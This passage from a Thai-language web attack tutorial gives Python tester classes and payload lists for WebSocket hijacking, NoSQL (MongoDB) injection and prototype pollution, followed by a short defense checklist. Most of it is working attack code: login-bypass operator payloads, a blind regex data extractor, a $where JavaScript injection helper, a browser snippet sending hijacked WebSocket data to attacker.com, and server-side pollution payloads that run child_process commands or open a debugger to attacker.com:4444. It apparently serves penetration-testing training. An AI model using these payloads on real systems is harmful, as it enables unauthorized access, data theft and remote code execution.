        ws_no_auth = WebSocketTester(self.ws_url, headers=headers_no_auth)
        result2 = ws_no_auth.connect_and_test('{"action": "get_user"}')
        if result2["messages"]:
            results.append({
                "test": "Empty token",
                "result": "Check response",
                "data": result2["messages"]
            })
        
        return results


WEBSOCKET_TOOLS = """
# WebSocket Security Testing Tools

# 1. wscat - command line WebSocket client
npm install -g wscat
wscat -c ws://target.com/ws
wscat -c ws://target.com/ws -H 'Authorization: Bearer TOKEN'

# 2. Burp Suite - intercept WebSocket
# Proxy > WebSockets history
# Right-click message > Send to Repeater

# 3. websocat
websocat ws://target.com/ws
websocat ws://target.com/ws -H "Cookie: session=TOKEN"

# 4. Python websocket-client
pip install websocket-client

# 5. CSWSH check - verify Origin validation
# In browser console:
var ws = new WebSocket('ws://target.com/ws');
ws.onopen = () => ws.send('secret');
ws.onmessage = (e) => fetch('//attacker.com/?data='+e.data);

# Interception with mitmproxy
mitmproxy --mode transparent --ssl-insecure
"""

print(WEBSOCKET_TOOLS)
```

---

## Step 468: NoSQL Injection Attacks

### แนวคิด
NoSQL databases เช่น MongoDB มีช่องโหว่เฉพาะตัวเมื่อ JSON จาก user input ถูกใช้ใน queries

```python
import requests
import json
from typing import Optional

class NoSQLInjector:
    """
    NoSQL Injection testing (MongoDB focus)
    """
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def auth_bypass_json(self, username: str, endpoint: str = "/api/login") -> Optional[dict]:
        """MongoDB authentication bypass ผ่าน JSON operator injection"""
        payloads = [
            # $ne operator - not equal
            {"username": username, "password": {"$ne": ""}},
            # $gt operator - greater than
            {"username": username, "password": {"$gt": ""}},
            # $regex operator
            {"username": username, "password": {"$regex": ".*"}},
            # $where operator (JS injection)
            {"username": username, "password": {"$where": "this.password.length > 0"}},
            # Bypass both fields
            {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        ]
        
        for payload in payloads:
            try:
                resp = self.session.post(
                    f"{self.url}{endpoint}",
                    json=payload,
                    timeout=10
                )
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("token") or data.get("success"):
                        return {
                            "payload": payload,
                            "response": data
                        }
            except Exception:
                pass
        
        return None
    
    def auth_bypass_url_params(self, endpoint: str, username: str) -> list:
        """Bypass via URL parameters"""
        # เมื่อเซิร์ฟเวอร์แปลง param เป็น JSON object
        payloads = [
            f"?username={username}&password[$ne]=invalid",
            f"?username={username}&password[$regex]=.*",
            f"?username[$ne]=invalid&password[$ne]=invalid",
        ]
        
        results = []
        for payload in payloads:
            try:
                resp = self.session.get(
                    f"{self.url}{endpoint}{payload}",
                    timeout=10
                )
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "success": resp.status_code == 200
                })
            except Exception:
                pass
        
        return results
    
    def extract_data_blind(self, endpoint: str, collection: str,
                            field: str) -> str:
        """Blind NoSQL data extraction"""
        charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$"
        result = ""
        
        for pos in range(1, 50):
            for char in charset:
                payload = {
                    field: {"$regex": f"^{result}{char}"},
                }
                try:
                    resp = self.session.post(
                        f"{self.url}{endpoint}",
                        json=payload,
                        timeout=5
                    )
                    if resp.status_code == 200 and "valid" in resp.text.lower():
                        result += char
                        break
                except Exception:
                    pass
            else:
                break
        
        return result
    
    def javascript_injection(self, endpoint: str, js_code: str) -> dict:
        """MongoDB JavaScript injection ($where)"""
        payload = {
            "username": {"$where": f"function() {{ {js_code} }}"},
        }
        
        try:
            resp = self.session.post(
                f"{self.url}{endpoint}",
                json=payload,
                timeout=10
            )
            return {
                "status": resp.status_code,
                "response": resp.text[:200]
            }
        except Exception as e:
            return {"error": str(e)}


NOSQL_PAYLOADS = """
# NoSQL Injection Payloads

# MongoDB auth bypass
# POST /login Content-Type: application/json
{"username": "admin", "password": {"$ne": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}

# URL parameter injection
GET /api/users?username[$ne]=invalid&password[$ne]=invalid
GET /api/search?q[$gt]=""
GET /api/user?id[$regex]=.*

# MongoDB Operator Injection
$eq - equal
$ne - not equal  
$gt - greater than
$gte - greater than or equal
$lt - less than
$lte - less than or equal
$in - in array
$nin - not in array
$regex - regex match
$where - JavaScript evaluation
$exists - field exists

# Tools
# NoSQLMap
python nosqlmap.py -u http://target.com/login --dbPort 27017 --attack 1

# mongofuzz
git clone https://github.com/pownio/mongofuzz
python3 mongofuzz.py -u 'http://target/api/login' -d '{"username":"FUZZ","password":"test"}'
"""

print(NOSQL_PAYLOADS)
```

---

## Step 469: Client-Side Prototype Pollution

### แนวคิด
Prototype Pollution เกิดขึ้นใน JavaScript เมื่อ attacker สามารถเพิ่ม properties เข้าไปใน Object.prototype

```python
import requests
from typing import Optional

class PrototypePollutionTester:
    """
    Prototype Pollution vulnerability testing
    """
    
    # Detection probes
    DETECTION_PROBES = [
        # URL query string
        "?__proto__[testPollution]=polluted",
        "?constructor[prototype][testPollution]=polluted",
        "?__proto__.testPollution=polluted",
        
        # JSON body
        '{"__proto__": {"testPollution": "polluted"}}',
        '{"constructor": {"prototype": {"testPollution": "polluted"}}}',
    ]
    
    # XSS via PP
    XSS_PAYLOADS = [
        # Via innerHTML sink
        "?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
        # Via innerHTML in template
        "?__proto__[template]=<img src=x onerror=alert(1)>",
        # Generic payload
        '{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}',
    ]
    
    # RCE via PP (Node.js)
    SERVER_SIDE_PAYLOADS = [
        # child_process exec via lodash.defaultsDeep
        {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=attacker.com:4444"}},
        # ejs template injection via PP
        {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').exec('id');x"}},
        # handlebars
        {"__proto__": {"__defineGetter__": "... "}},
    ]
    
    def __init__(self, url: str):
        self.url = url
        self.session = requests.Session()
    
    def test_url_pollution(self) -> list:
        """ทดสอบ PP ผ่าน URL parameters"""
        results = []
        
        for probe in self.DETECTION_PROBES[:3]:  # URL probes only
            try:
                resp = self.session.get(
                    f"{self.url}{probe}",
                    timeout=10
                )
                # Check if pollution reflected in response
                if "polluted" in resp.text:
                    results.append({
                        "probe": probe,
                        "vulnerable": True,
                        "reflected": True
                    })
            except Exception:
                pass
        
        return results
    
    def test_json_pollution(self, endpoint: str = "/") -> list:
        """ทดสอบ PP ผ่าน JSON body"""
        results = []
        
        for probe in self.DETECTION_PROBES[3:]:  # JSON probes
            try:
                resp = self.session.post(
                    f"{self.url}{endpoint}",
                    data=probe,
                    headers={"Content-Type": "application/json"},
                    timeout=10
                )
                if "polluted" in resp.text:
                    results.append({
                        "probe": probe,
                        "vulnerable": True,
                        "reflected": True
                    })
            except Exception:
                pass
        
        return results
    
    def test_server_side_pp(self, endpoint: str = "/") -> list:
        """ทดสอบ Server-Side PP (Node.js)"""
        results = []
        
        for payload in self.SERVER_SIDE_PAYLOADS:
            try:
                resp = self.session.post(
                    f"{self.url}{endpoint}",
                    json=payload,
                    timeout=30
                )
                results.append({
                    "payload": str(payload)[:100],
                    "status": resp.status_code,
                    "response_size": len(resp.content)
                })
            except Exception:
                pass
        
        return results


PP_DETECTION_JS = """
// Client-side Prototype Pollution Detection
// Run in browser console

// Check if pollution via URL works
function checkPollution() {
  const url = new URL(location.href);
  url.searchParams.set('__proto__[testPP]', 'polluted');
  
  fetch(url.toString()).then(r => r.text()).then(html => {
    // Probe if reflected
    const testObj = {};
    if (testObj.testPP === 'polluted') {
      console.log('[!] Prototype Pollution detected!');
    }
  });
}

// Check common sinks
// 1. URL hash via fragment identifier
if (location.hash) {
  const params = Object.fromEntries(new URLSearchParams(location.hash.slice(1)));
  // Look for __proto__ in params
}

// 2. JSON.parse with untrusted input
try {
  const payload = '{"__proto__": {"isAdmin": true}}';
  JSON.parse(payload);
  console.log('isAdmin pollution:', ({}).isAdmin);
} catch(e) {}

// Tools:
// ppmap - Prototype Pollution scanner
// https://github.com/kleiton0x00/ppmap
ppmap -u https://target.com/?q=test
"""

print(PP_DETECTION_JS)
```

---

## Step 470: Advanced Web App Defense

### แนวคด
การรวมสรุปเทคนิคต่างๆ และการป้องกัน web application attacks

```python
class WebAppDefenseGuide:
    """
    Web Application Defense Best Practices
    """
    
    SECURITY_CONTROLS = {
        "SQL Injection": [
            "Use parameterized queries / prepared statements",
            "ORM with proper parameter binding",
            "Input validation and whitelist filtering",
            "WAF with SQLi signatures",
            "Least privilege database accounts",
            "Disable detailed error messages",
        ],
        "SSTI": [
            "Never concatenate user input into templates",
            "Use sandboxed template engines",
            "Whitelist allowed template variables",
            "Use Jinja2 with sandbox environment",
            "Consider server-side rendering alternatives",
        ],
        "XXE": [
            "Disable DTD processing (DOCTYPE declarations)",
            "Disable external entity resolution",
            "Use defusedxml in Python",
            "Update XML parser libraries",
            "Use JSON instead of XML where possible",
        ],
        "Deserialization": [
            "Never deserialize untrusted data",
            "Use integrity checking (HMAC) before deserializing",
            "Avoid Java serialization (use JSON/Protobuf)",
            "Implement deserializ ation filters",
            "Monitor for gadget chains in dependencies",
        ],
        "JWT/OAuth": [
            "Reject 'none' algorithm",
            "Verify algorithm matches expected (alg restriction)",
            "Use RS256 with proper key validation",
            "Short expiration times",
            "Validate state parameter in OAuth",
            "Strict redirect_uri validation",
        ],
    }
    
    def generate_checklist(self) -> str:
        checklist = ["=" * 60]
        checklist.append("WEB APPLICATION SECURITY CHECKLIST")
        checklist.append("=" * 60)
        
        for category, controls in self.SECURITY_CONTROLS.items():
            checklist.append(f"\n## {category}")
            for control in controls:
                checklist.append(f"  [ ] {control}")
        
        return "\n".join(checklist)
    
    def generate_security_headers(self) -> str:
        return """
# Security Headers
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), microphone=(), camera=()
X-XSS-Protection: 0  # Let CSP handle this
Cache-Control: no-store  # For sensitive responses
"""


if __name__ == "__main__":
    guide = WebAppDefenseGuide()
    print(guide.generate_checklist())
    print(guide.generate_security_headers())
```

---

## สรุป Part 47

ในส่วนนี้ได้เรียนรู้:

1. **Advanced SQLi** - Blind, Time-based, OOB, Second-order
2. **SSTI** - Jinja2, Twig, Freemarker, Velocity exploitation
3. **XXE** - File read, SSRF, Blind OOB, DoS
4. **Deserialization** - Python Pickle, PHP, Java ysoserial
5. **HTTP Request Smuggling** - CL.TE, TE.CL attacks
6. **OAuth/JWT** - Algorithm confusion, none attack, CSRF
7. **WebSocket** - Injection, CSWSH, Auth bypass
8. **NoSQL Injection** - MongoDB operator injection
9. **Prototype Pollution** - Client/Server side
10. **Web App Defense** - Security controls checklist

### เครื่องมือสำคัญ
- `sqlmap` - SQL injection automation
- `tplmap` - SSTI automation
- `ysoserial` - Java deserialization payloads
- `smuggler.py` - HTTP request smuggling
- `jwt_tool` - JWT attack toolkit
- `NoSQLMap` - NoSQL injection testing
